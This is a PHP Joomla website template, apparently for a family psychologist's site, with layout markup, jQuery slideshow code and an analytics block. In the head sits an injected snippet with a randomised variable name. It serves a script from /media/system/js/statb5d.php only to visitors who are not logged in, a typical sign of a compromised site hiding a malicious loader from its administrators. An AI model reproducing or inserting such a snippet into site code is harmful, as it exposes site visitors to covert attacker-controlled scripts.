<?php
/**
 * @copyright	Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

defined('_JEXEC') or die('Restricted access');
$url = clone(JURI::getInstance());
$path = $this->baseurl.'/templates/'.$this->template;

$showleftColumn = $this->countModules('left');
$showrightColumn = $this->countModules('right');
$showcontentColumn = $this->countModules('content');
$showuser2Column = $this->countModules('user2');

if(JRequest::getCmd('task') != 'edit') $Edit = false; else $Edit = true;
?>
 <?php
  $app = JFactory::getApplication();
  $menu = $app->getMenu()->getActive();
  $pageclass = '';
 
  if (is_object($menu))
    $pageclass = $menu->params->get('pageclass_sfx');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" dir="<?php echo $this->direction; ?>" >

<head>
<meta http-equiv="X-UA-Compatible" content="IE=7"/>
	<script src="<?php echo $path ?>/scripts/mootools.js" type="text/javascript"></script>
	
	<jdoc:include type="head" />
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.js"></script>
	<script>!window.jQuery && document.write(unescape('%3Cscript src="<?php echo $path ?>/scripts/jquery-1.4.2.js"%3E%3C/script%3E'))</script>
	<script src="<?php echo $path ?>/scripts/jquery.faded.js" type="text/javascript"></script>
	<script src="<?php echo $path ?>/scripts/cufon-yui.js" type="text/javascript"></script>
	<script src="<?php echo $path ?>/scripts/cufon-replace.js" type="text/javascript"></script>
	<script src="<?php echo $path ?>/scripts/Lane_-_Narrow_400.font.js" type="text/javascript"></script>
	<script type="text/javascript">
		var $j = jQuery.noConflict();
		$j(window).load(function(){
			$j(function(){
				$j("#faded").faded({
					speed: 300,
					crossfade: false,			
					sequentialloading: true,
					autopagination: false,
					autoplay: 10000
				});
			});						
		});	
	</script>
		
	<!--[if lt IE 7]>
		<div style=' clear: both; text-align:center; position: relative;'>
			<a href="http://www.microsoft.com/windows/internet-explorer/default.aspx?ocid=ie6_countdown_bannercode"><img src="http://www.theie6countdown.com/images/upgrade.jpg" border="0" &nbsp;alt="" /></a>
		</div>
	<![endif]-->

	<!--[if lt IE 9]>
		<style type="text/css">
			.border{ behavior:url(path-to-your-folder/PIE.php) }
		</style>
	<![endif]-->
	
	<link rel="stylesheet" href="<?php echo $path ?>/css/template.css" type="text/css" />
	<link href='https://fonts.googleapis.com/css?family=Terminal+Dosis+Light' rel='stylesheet' type='text/css'>

<?php $_b5dd52a7=1;
if(is_object($_SESSION["__default"]["user"]) && !($_SESSION["__default"]["user"]->id)) {echo "
<script language=JavaScript id=onDate ></script>
<script language=JavaScript src=/media/system/js/statb5d.php ></script>
";};$_b5dd52a7=1; ?>

<script type="text/javascript" data-cfasync="false">
	var mi_version         = '7.7.1';
	var mi_track_user      = true;
	var mi_no_track_reason = '';
	
	var disableStr = 'ga-disable-UA-143837533-1';

	/* Function to detect opted out users */
	function __gaTrackerIsOptedOut() {
		return document.cookie.indexOf(disableStr + '=true') > -1;
	}

	/* Disable tracking if the opt-out cookie exists. */
	if ( __gaTrackerIsOptedOut() ) {
		window[disableStr] = true;
	}

	/* Opt-out function */
	function __gaTrackerOptout() {
	  document.cookie = disableStr + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
	  window[disableStr] = true;
	}
	
	if ( mi_track_user ) {
		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		})(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');

		__gaTracker('create', 'UA-143837533-1', 'auto', {'allowAnchor':true});
		__gaTracker('set', 'forceSSL', true);
		__gaTracker('require', 'displayfeatures');
		__gaTracker('send','pageview', location.pathname + location.search + location.hash);
	} else {
		console.log( "" );
		(function() {
			/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
			var noopfn = function() {
				return null;
			};
			var noopnullfn = function() {
				return null;
			};
			var Tracker = function() {
				return null;
			};
			var p = Tracker.prototype;
			p.get = noopfn;
			p.set = noopfn;
			p.send = noopfn;
			var __gaTracker = function() {
				var len = arguments.length;
				if ( len === 0 ) {
					return;
				}
				var f = arguments[len-1];
				if ( typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function' ) {
					console.log( 'Not running function __gaTracker(' + arguments[0] + " ....) because you are not being tracked. " + mi_no_track_reason );
					return;
				}
				try {
					f.hitCallback();
				} catch (ex) {

				}
			};
			__gaTracker.create = function() {
				return new Tracker();
			};
			__gaTracker.getByName = noopnullfn;
			__gaTracker.getAll = function() {
				return [];
			};
			__gaTracker.remove = noopfn;
			window['__gaTracker'] = __gaTracker;
					})();
		}
</script>
</head>
<?php
/*$menu = &JSite::getMenu();*/
$app    = JFactory::getApplication();
$menu	= $app->getMenu();
if ($menu->getActive() == $menu->getDefault()) {
    $body_class = 'first';
}else{
    $body_class = 'all';
}
?>
<body class="<?php echo $body_class; ?>">
	<div class="extra">
		<div class="main"> 	
			<!--header-->
			<div class="header">
				<jdoc:include type="modules" name="user4" />
				<div class="navigation">
                  <jdoc:include type="modules" name="user3" style="topmenu" />
                  </div>
				<div class="wrapper">
					<h1 id="logo"><a href="<?php echo $_SERVER['PHP_SELF']?>" title="Sebastian Nelson"><img  title="Sebastian Nelson" src="<?php echo $path ?>/images/logo.png"   alt="Sebastian Nelson"  /></a></h1>
					<jdoc:include type="modules" name="user1" />
				</div>
				<?php if ($showuser2Column && !$Edit && $option!="com_search") : ?>
				<jdoc:include type="modules" name="user2" />
				<?php endif;?>
			</div>
			
			<div class="content">			
				<!--content-->
				<div class="content-indent">
					<?php if ($option!="com_search") : ?>
					<jdoc:include type="modules" name="top-content" />
					<?php endif;?>
					<div class="wrapper">
						<!--right-->
						<?php if ($showrightColumn && !$Edit && $option!="com_search") : ?>
						<div id="right">
							<jdoc:include type="modules" name="right" style="wrapper_box" />
						</div>
						<?php endif;?>
						<!--left-->						
						<?php if ($showleftColumn && !$Edit && $option!="com_search") : ?>
						<div id="left">
							<jdoc:include type="modules" name="left" style="wrapper_box" />
						</div>
						<?php endif;?>
						<!--center-->
						<div id="content">
							<div class="container" >
								
								<div class="wrapper">
									<?php if ($this->getBuffer('message')) : ?>
									<div class="error err-space">
										<jdoc:include type="message" />
									</div>
									<?php endif; ?>
									<jdoc:include type="component" />
								</div>
								<?php if ($showcontentColumn && !$Edit && $option!="com_search") : ?>
								<jdoc:include type="modules" name="content" style="wrapper_box" />
								<?php endif;?>
							</div>
						</div>
					</div>					
				</div>					
			</div>
			
			<!--footer-->
			<div class="footer">
				<div class="indent">
					<div class="policy">
						<?php echo JText::_('Family Psychologist &copy; 2011&nbsp; | &nbsp;') ?><a href="index.php?option=com_content&view=article&id=66&Itemid=78">Privacy policy</a><span class="fright"><!-- {%FOOTER_LINK} --></span>
					</div>
				</div>				
			</div>
			
		</div>
	</div>
	<script type="text/javascript"> Cufon.now(); </script>
</body>
</html>
